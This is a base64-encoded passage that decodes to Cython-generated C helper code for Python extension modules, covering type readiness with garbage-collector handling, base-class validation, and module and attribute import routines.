RfSVRFTShiYXNlcywgaSk7CiNlbHNlCiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlUdXBsZV9HZXRJdGVtKGJhc2VzLCBpKTsKICAgICAgICBpZiAoIWIwKSByZXR1cm4gLTE7CiNlbmRpZgogICAgICAgIGIgPSAoUHlUeXBlT2JqZWN0KikgYjA7CiAgICAgICAgaWYgKCFfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShiLCBQeV9UUEZMQUdTX0hFQVBUWVBFKSkKICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X1R5cGVOYW1lIGJfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoYik7CiAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAiYmFzZSBjbGFzcyAnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIicgaXMgbm90IGEgaGVhcCB0eXBlIiwgYl9uYW1lKTsKICAgICAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKGJfbmFtZSk7CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICBQeV9ERUNSRUYoYjApOwojZW5kaWYKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgICAgICBpZiAoZGljdG9mZnNldCA9PSAwKQogICAgICAgIHsKICAgICAgICAgICAgUHlfc3NpemVfdCBiX2RpY3RvZmZzZXQgPSAwOwojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAgICAgICAgIGJfZGljdG9mZnNldCA9IGItPnRwX2RpY3RvZmZzZXQ7CiNlbHNlCiAgICAgICAgICAgIFB5T2JqZWN0ICpweV9iX2RpY3RvZmZzZXQgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKChQeU9iamVjdCopYiwgIl9fZGljdG9mZnNldF9fIik7CiAgICAgICAgICAgIGlmICghcHlfYl9kaWN0b2Zmc2V0KSBnb3RvIGRpY3RvZmZzZXRfcmV0dXJuOwogICAgICAgICAgICBiX2RpY3RvZmZzZXQgPSBQeUxvbmdfQXNTc2l6ZV90KHB5X2JfZGljdG9mZnNldCk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihweV9iX2RpY3RvZmZzZXQpOwogICAgICAgICAgICBpZiAoYl9kaWN0b2Zmc2V0ID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpIGdvdG8gZGljdG9mZnNldF9yZXR1cm47CiNlbmRpZgogICAgICAgICAgICBpZiAoYl9kaWN0b2Zmc2V0KSB7CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfVHlwZU5hbWUgYl9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShiKTsKICAgICAgICAgICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAiZXh0ZW5zaW9uIHR5cGUgJyUuMjAwcycgaGFzIG5vIF9fZGljdF9fIHNsb3QsICIKICAgICAgICAgICAgICAgICAgICAgICAgImJ1dCBiYXNlIHR5cGUgJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIGhhczogIgogICAgICAgICAgICAgICAgICAgICAgICAiZWl0aGVyIGFkZCAnY2RlZiBkaWN0IF9fZGljdF9fJyB0byB0aGUgZXh0ZW5zaW9uIHR5cGUgIgogICAgICAgICAgICAgICAgICAgICAgICAib3IgYWRkICdfX3Nsb3RzX18gPSBbLi4uXScgdG8gdGhlIGJhc2UgdHlwZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGVfbmFtZSwgYl9uYW1lKTsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoYl9uYW1lKTsKICAgICAgICAgICAgICAgIH0KI2lmICFDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICAgICAgICAgICBkaWN0b2Zmc2V0X3JldHVybjoKI2VuZGlmCiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICAgICAgUHlfREVDUkVGKGIwKTsKI2VuZGlmCiAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIFB5X0RFQ1JFRihiMCk7CiNlbmRpZgogICAgfQogICAgcmV0dXJuIDA7Cn0KI2VuZGlmCgoKQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9IYXNNdWx0aXBsZUluaGVyaXRhbmNlKFB5VHlwZU9iamVjdCAqdCkgewogICAgd2hpbGUgKHQpIHsKICAgICAgICBQeU9iamVjdCAqYmFzZXMgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0LCB0cF9iYXNlcywgUHlPYmplY3QqKTsKICAgICAgICBpZiAoYmFzZXMpIHsKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIHQgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0LCB0cF9iYXNlLCBQeVR5cGVPYmplY3QqKTsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX1JlYWR5KFB5VHlwZU9iamVjdCAqdCkgewojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIHx8ICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgZGVmaW5lZChQWVNUT05fTUFKT1JfVkVSU0lPTikKICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwOwojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgICAodm9pZClfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZTsKI2VuZGlmCiAgICByZXR1cm4gUHlUeXBlX1JlYWR5KHQpOwojZWxzZQogICAgaW50IHI7CiAgICBpZiAoIV9fUHl4X1B5VHlwZV9IYXNNdWx0aXBsZUluaGVyaXRhbmNlKHQpKSB7CiAgICAgICAgcmV0dXJuIFB5VHlwZV9SZWFkeSh0KTsKICAgIH0KICAgIFB5T2JqZWN0ICpiYXNlcyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2VzLCBQeU9iamVjdCopOwogICAgaWYgKGJhc2VzICYmIHVubGlrZWx5KF9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlKHQtPnRwX25hbWUsIHQtPnRwX2RpY3RvZmZzZXQsIGJhc2VzKSA9PSAtMSkpCiAgICAgICAgcmV0dXJuIC0xOwojaWYgIWRlZmluZWQoUFlTVE9OX01BSk9SX1ZFUlNJT04pCiAgICB7CiAgICAgICAgaW50IGdjX3dhc19lbmFibGVkOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwYjEKICAgICAgICBnY193YXNfZW5hYmxlZCA9IFB5R0NfRGlzYWJsZSgpOwogICAgICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwOwogICAgI2Vsc2UKICAgICAgICBQeU9iamVjdCAqcmV0LCAqcHlfc3RhdHVzOwogICAgICAgIFB5T2JqZWN0ICpnYyA9IE5VTEw7CiAgICAgICAgI2lmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0rMCA+PSAweDA3MDMwNDAwKSAmJlwKICAgICAgICAgICAgICAgICFDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMCiAgICAgICAgZ2MgPSBQeUltcG9ydF9HZXRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nYyk7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KCFnYykpIGdjID0gUHlJbXBvcnRfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ2MpOwogICAgICAgIGlmICh1bmxpa2VseSghZ2MpKSByZXR1cm4gLTE7CiAgICAgICAgcHlfc3RhdHVzID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoZ2MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaXNlbmFibGVkKTsKICAgICAgICBpZiAodW5saWtlbHkoIXB5X3N0YXR1cykpIHsKICAgICAgICAgICAgUHlfREVDUkVGKGdjKTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgICAgICBnY193YXNfZW5hYmxlZCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9zdGF0dXMpOwogICAgICAgIFB5X0RFQ1JFRihweV9zdGF0dXMpOwogICAgICAgIGlmIChnY193YXNfZW5hYmxlZCA+IDApIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoZ2MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZGlzYWJsZSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmV0KSkgewogICAgICAgICAgICAgICAgUHlfREVDUkVGKGdjKTsKICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBQeV9ERUNSRUYocmV0KTsKICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGdjX3dhc19lbmFibGVkID09IC0xKSkgewogICAgICAgICAgICBQeV9ERUNSRUYoZ2MpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgI2VuZGlmCiAgICAgICAgdC0+dHBfZmxhZ3MgfD0gUHlfVFBGTEFHU19IRUFQVFlQRTsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKICAgICAgICB0LT50cF9mbGFncyB8PSBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEU7CiNlbmRpZgojZWxzZQogICAgICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwOwojZW5kaWYKICAgIHIgPSBQeVR5cGVfUmVhZHkodCk7CiNpZiAhZGVmaW5lZChQWVNUT05fTUFKT1JfVkVSU0lPTikKICAgICAgICB0LT50cF9mbGFncyAmPSB+UHlfVFBGTEFHU19IRUFQVFlQRTsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMGIxCiAgICAgICAgaWYgKGdjX3dhc19lbmFibGVkKQogICAgICAgICAgICBQeUdDX0VuYWJsZSgpOwogICAgI2Vsc2UKICAgICAgICBpZiAoZ2Nfd2FzX2VuYWJsZWQpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnRwLCAqdiwgKnRiOwogICAgICAgICAgICBQeUVycl9GZXRjaCgmdHAsICZ2LCAmdGIpOwogICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChnYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbmFibGUpOwogICAgICAgICAgICBpZiAobGlrZWx5KHJldCB8fCByID09IC0xKSkgewogICAgICAgICAgICAgICAgUHlfWERFQ1JFRihyZXQpOwogICAgICAgICAgICAgICAgUHlFcnJfUmVzdG9yZSh0cCwgdiwgdGIpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0cCk7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHYpOwogICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0Yik7CiAgICAgICAgICAgICAgICByID0gLTE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKGdjKTsKICAgICNlbmRpZgogICAgfQojZW5kaWYKICAgIHJldHVybiByOwojZW5kaWYKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0KFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqZnJvbV9saXN0LCBpbnQgbGV2ZWwpIHsKICAgIFB5T2JqZWN0ICptb2R1bGUgPSAwOwogICAgUHlPYmplY3QgKmVtcHR5X2RpY3QgPSAwOwogICAgUHlPYmplY3QgKmVtcHR5X2xpc3QgPSAwOwogICAgZW1wdHlfZGljdCA9IFB5RGljdF9OZXcoKTsKICAgIGlmICh1bmxpa2VseSghZW1wdHlfZGljdCkpCiAgICAgICAgZ290byBiYWQ7CiAgICBpZiAobGV2ZWwgPT0gLTEpIHsKICAgICAgICBjb25zdCBjaGFyKiBwYWNrYWdlX3NlcCA9IHN0cmNocihfX1B5eF9NT0RVTEVfTkFNRSwgJy4nKTsKICAgICAgICBpZiAocGFja2FnZV9zZXAgIT0gKDApKSB7CiAgICAgICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KAogICAgICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCAxKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSB7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIVB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfSW1wb3J0RXJyb3IpKSkKICAgICAgICAgICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgbGV2ZWwgPSAwOwogICAgfQogICAgaWYgKCFtb2R1bGUpIHsKICAgICAgICBtb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGVMZXZlbE9iamVjdCgKICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCBsZXZlbCk7CiAgICB9CmJhZDoKICAgIFB5X1hERUNSRUYoZW1wdHlfZGljdCk7CiAgICBQeV9YREVDUkVGKGVtcHR5X2xpc3QpOwogICAgcmV0dXJuIG1vZHVsZTsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9FcnJvcihQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlLCBQeV9zc2l6ZV90IGNvdW50KSB7CiAgICBQeU9iamVjdCAqcGFydGlhbF9uYW1lID0gTlVMTCwgKnNsaWNlID0gTlVMTCwgKnNlcCA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IHNpemU7CiAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgfQojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIHNpemUgPSBQeVR1cGxlX0dFVF9TSVpFKHBhcnRzX3R1cGxlKTsKI2Vsc2UKICAgIHNpemUgPSBQeVR1cGxlX1NpemUocGFydHNfdHVwbGUpOwogICAgaWYgKHNpemUgPCAwKSBnb3RvIGJhZDsKI2VuZGlmCiAgICBpZiAobGlrZWx5KHNpemUgPT0gY291bnQpKSB7CiAgICAgICAgcGFydGlhbF9uYW1lID0gbmFtZTsKICAgIH0gZWxzZSB7CiAgICAgICAgc2xpY2UgPSBQeVNlcXVlbmNlX0dldFNsaWNlKHBhcnRzX3R1cGxlLCAwLCBjb3VudCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzbGljZSkpCiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIHNlcCA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZSgiLiIsIDEpOwogICAgICAgIGlmICh1bmxpa2VseSghc2VwKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgcGFydGlhbF9uYW1lID0gUHlVbmljb2RlX0pvaW4oc2VwLCBzbGljZSk7CiAgICB9CiAgICBQeUVycl9Gb3JtYXQoCiAgICAgICAgUHlFeGNfTW9kdWxlTm90Rm91bmRFcnJvciwKICAgICAgICAiTm8gbW9kdWxlIG5hbWVkICclVSciLCBwYXJ0aWFsX25hbWUpOwpiYWQ6CiAgICBQeV9YREVDUkVGKHNlcCk7CiAgICBQeV9YREVDUkVGKHNsaWNlKTsKICAgIFB5X1hERUNSRUYocGFydGlhbF9uYW1lKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9Mb29rdXAoUHlPYmplY3QgKm5hbWUpIHsKICAgIFB5T2JqZWN0ICppbXBvcnRlZF9tb2R1bGU7CiNpZiAoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZUFlfVkVSU0lPTl9OVU0gIDwgMHgwNzAzMDQwMCkgfHxcCiAgICAgICAgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7CiAgICBpZiAodW5saWtlbHkoIW1vZHVsZXMpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgaW1wb3J0ZWRfbW9kdWxlID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIobW9kdWxlcywgbmFtZSk7CiAgICBQeV9YSU5DUkVGKGltcG9ydGVkX21vZHVsZSk7CiNlbHNlCiAgICBpbXBvcnRlZF9tb2R1bGUgPSBQeUltcG9ydF9HZXRNb2R1bGUobmFtZSk7CiNlbmRpZgogICAgcmV0dXJuIGltcG9ydGVkX21vZHVsZTsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZV9XYWxrUGFydHMoUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSkgewogICAgUHlfc3NpemVfdCBpLCBucGFydHM7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgbnBhcnRzID0gUHlUdXBsZV9HRVRfU0laRShwYXJ0c190dXBsZSk7CiNlbHNlCiAgICBucGFydHMgPSBQeVR1cGxlX1NpemUocGFydHNfdHVwbGUpOwogICAgaWYgKG5wYXJ0cyA8IDApIHJldHVybiBOVUxMOwojZW5kaWYKICAgIGZvciAoaT0xOyBpIDwgbnBhcnRzICYmIG1vZHVsZTsgaSsrKSB7CiAgICAgICAgUHlPYmplY3QgKnBhcnQsICpzdWJtb2R1bGU7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIHBhcnQgPSBQeVR1cGxlX0dFVF9JVEVNKHBhcnRzX3R1cGxlLCBpKTsKI2Vsc2UKICAgICAgICBwYXJ0ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHBhcnRzX3R1cGxlLCBpKTsKICAgICAgICBpZiAoIXBhcnQpIHJldHVybiBOVUxMOwojZW5kaWYKICAgICAgICBzdWJtb2R1bGUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihtb2R1bGUsIHBhcnQpOwojaWYgIShDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUykKICAgICAgICBQeV9ERUNSRUYocGFydCk7CiNlbmRpZgogICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpOwogICAgICAgIG1vZHVsZSA9IHN1Ym1vZHVsZTsKICAgIH0KICAgIGlmICh1bmxpa2VseSghbW9kdWxlKSkgewogICAgICAgIHJldHVybiBfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlX0Vycm9yKG5hbWUsIHBhcnRzX3R1cGxlLCBpKTsKICAgIH0KICAgIHJldHVybiBtb2R1bGU7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHsKICAgIFB5T2JqZWN0ICppbXBvcnRlZF9tb2R1bGU7CiAgICBQeU9iamVjdCAqbW9kdWxlID0gX19QeXhfSW1wb3J0KG5hbWUsIE5VTEwsIDApOwogICAgaWYgKCFwYXJ0c190dXBsZSB8fCB1bmxpa2VseSghbW9kdWxlKSkKICAgICAgICByZXR1cm4gbW9kdWxlOwogICAgaW1wb3J0ZWRfbW9kdWxlID0gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9Mb29rdXAobmFtZSk7CiAgICBpZiAobGlrZWx5KGltcG9ydGVkX21vZHVsZSkpIHsKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgICAgICByZXR1cm4gaW1wb3J0ZWRfbW9kdWxlOwogICAgfQogICAgUHlFcnJfQ2xlYXIoKTsKICAgIHJldHVybiBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGVfV2Fsa1BhcnRzKG1vZHVsZSwgbmFtZSwgcGFydHNfdHVwbGUpOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgUHlPYmplY3QgKm1vZHVsZSA9IF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKG5hbWUpOwogICAgaWYgKGxpa2VseShtb2R1bGUpKSB7CiAgICAgICAgUHlPYmplY3QgKnNwZWMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihtb2R1bGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGVjKTsKICAgICAgICBpZiAobGlrZWx5KHNwZWMpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICp1bnNhZmUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihzcGVjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5pdGlhbGl6aW5nKTsKICAgICAgICAgICAgaWYgKGxpa2VseSghdW5zYWZlIHx8ICFfX1B5eF9QeU9iamVjdF9Jc1RydWUodW5zYWZlKSkpIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihzcGVjKTsKICAgICAgICAgICAgICAgIHNwZWMgPSBOVUxMOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFB5X1hERUNSRUYodW5zYWZlKTsKICAgICAgICB9CiAgICAgICAgaWYgKGxpa2VseSghc3BlYykpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICAgICAgcmV0dXJuIG1vZHVsZTsKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKHNwZWMpOwogICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpOwogICAgfSBlbHNlIGlmIChQeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZShuYW1lLCBwYXJ0c190dXBsZSk7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TGlzdF9QYWNrKFB5X3NzaXplX3QgbiwgLi4uKSB7CiAgICB2YV9saXN0IHZhOwogICAgUHlPYmplY3QgKmwgPSBQeUxpc3RfTmV3KG4pOwogICAgdmFfc3RhcnQodmEsIG4pOwogICAgaWYgKHVubGlrZWx5KCFsKSkgZ290byBlbmQ7CiAgICBmb3IgKFB5X3NzaXplX3QgaT0wOyBpPG47ICsraSkgewogICAgICAgIFB5T2JqZWN0ICphcmcgPSB2YV9hcmcodmEsIFB5T2JqZWN0Kik7CiAgICAgICAgUHlfSU5DUkVGKGFyZyk7CiAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShsLCBpLCBhcmcpICE9ICgwKSkgewogICAgICAgICAgICBQeV9DTEVBUihsKTsKICAgICAgICAgICAgZ290byBlbmQ7CiAgICAgICAgfQogICAgfQogICAgZW5kOgogICAgdmFfZW5kKHZhKTsKICAgIHJldHVybiBsOwp9CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9JbXBvcnRGcm9tKFB5T2JqZWN0KiBtb2R1bGUsIFB5T2JqZWN0KiBuYW1lKSB7CiAgICBQeU9iamVjdCogdmFsdWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG1vZHVsZSwgbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSAmJiBQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkgewogICAgICAgIGNvbnN0IGNoYXIqIG1vZHVsZV9uYW1lX3N0ciA9IDA7CiAgICAgICAgUHlPYmplY3QqIG1vZHVsZV9uYW1lID0gMDsKICAgICAgICBQeU9iamVjdCogbW9kdWxlX2RvdCA9IDA7CiAgICAgICAgUHlPYmplY3QqIGZ1bGxfbmFtZSA9IDA7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICBtb2R1bGVfbmFtZV9zdHIgPSBQeU1vZHVsZV9HZXROYW1lKG1vZHVsZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfbmFtZV9zdHIpKSB7IGdvdG8gbW9kYmFkOyB9CiAgICAgICAgbW9kdWxlX25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhtb2R1bGVfbmFtZV9zdHIpOwogICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlX25hbWUpKSB7IGdvdG8gbW9kYmFkOyB9CiAgICAgICAgbW9kdWxlX2RvdCA9IFB5VW5pY29kZV9Db25jYXQobW9kdWxlX25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzEzKTsKICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZV9kb3QpKSB7IGdvdG8gbW9kYmFkOyB9CiAgICAgICAgZnVsbF9uYW1lID0gUHlVbmljb2RlX0NvbmNhdChtb2R1bGVfZG90LCBuYW1lKTsKICAgICAgICBpZiAodW5saWtlbHkoIWZ1bGxfbmFtZSkpIHsgZ290byBtb2RiYWQ7IH0KICAgICAgICAjaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWVBZX1ZFUlNJT05fTlVNICA8IDB4MDcwMzA0MDApIHx8XAogICAgICAgICAgICAgICAgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlcykpCiAgICAgICAgICAgICAgICBnb3RvIG1vZGJhZDsKICAgICAgICAgICAgdmFsdWUgPSBQeU9iamVjdF9HZXRJdGVtKG1vZHVsZXMsIGZ1bGxfbmFtZSk7CiAgICAgICAgfQogICAgICAgICNlbHNlCiAgICAgICAgdmFsdWUgPSBQeUltcG9ydF9HZXRNb2R1bGUoZnVsbF9uYW1lKTsKICAgICAgICAjZW5kaWYKICAgICAgbW9kYmFkOgogICAgICAgIFB5X1hERUNSRUYoZnVsbF9uYW1lKTsKICAgICAgICBQeV9YREVDUkVGKG1vZHVsZV9kb3QpOwogICAgICAgIFB5X1hERUNSRUYobW9kdWxlX25hbWUpOwogICAgfQogICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHsKICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfSW1wb3J0RXJyb3IsICJjYW5ub3QgaW1wb3J0IG5hbWUgJVMiLCBuYW1lKTsKICAgIH0KICAgIHJldHVybiB2YWx1ZTsKfQoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseV9HZW5lcmljKFB5T2JqZWN0ICpzZXEsIFB5X3NzaXplX3QgbXVsKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0LCAqcHltdWwgPSBQeUxvbmdfRnJvbVNzaXplX3QobXVsKTsKICAgIGlmICh1bmxpa2VseSghcHltdWwpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gUHlOdW1iZXJfTXVsdGlwbHkoc2VxLCBweW11bCk7CiAgICBQeV9ERUNSRUYocHltdWwpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseShQeU9iamVjdCAqc2VxLCBQeV9zc2l6ZV90IG11bCkgewojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICBQeVR5cGVPYmplY3QgKnR5cGUgPSBQeV9UWVBFKHNlcSk7CiAgICBpZiAobGlrZWx5KHR5cGUtPnRwX2FzX3NlcXVlbmNlICYmIHR5cGUtPnRwX2FzX3NlcXVlbmNlLT5zcV9yZXBlYXQpKSB7CiAgICAgICAgcmV0dXJuIHR5cGUtPnRwX2FzX3NlcXVlbmNlLT5zcV9yZXBlYXQoc2VxLCBtdWwpOwogICAgfSBlbHNlCiNlbmRpZgogICAgewogICAgICAgIHJldHVybiB